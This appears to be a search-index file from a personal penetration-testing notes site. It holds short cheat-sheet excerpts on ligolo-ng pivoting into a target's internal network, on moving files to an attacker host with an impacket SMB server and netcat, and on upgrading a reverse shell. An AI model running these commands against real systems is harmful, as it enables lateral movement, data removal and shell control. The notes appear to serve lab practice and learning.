var relearn_searchindex = [
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Dragonfly Commando",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Ligolo",
    "uri": "/tags/ligolo/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "ligolo-ng Set a proxy server ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha\nor\nfrom ligolo proxy interface interface_add_route --name hong --route 240.0.0.1/32",
    "description": "ligolo-ng Set a proxy server ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha",
    "tags": [
      "Ligolo"
    ],
    "title": "Pivoting",
    "uri": "/posts/pivoting/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Posts",
    "uri": "/posts/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc -q 0 192.168.45.211 1234 \u003c file.txt\nwindows file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc.exe -w 1 192.168.45.211 1234 \u003c file.txt",
    "description": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver",
    "tags": [
      "Smbserver",
      "Nc"
    ],
    "title": "File Transfer",
    "uri": "/posts/file-transfer/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nc",
    "uri": "/tags/nc/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Smbserver",
    "uri": "/tags/smbserver/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Writeup",
    "uri": "/writeup/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Reverseshell",
    "uri": "/tags/reverseshell/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "description": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "tags": [
      "Reverseshell"
    ],
    "title": "Stabilize a reverse shell",
    "uri": "/posts/revshell-upgrade/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
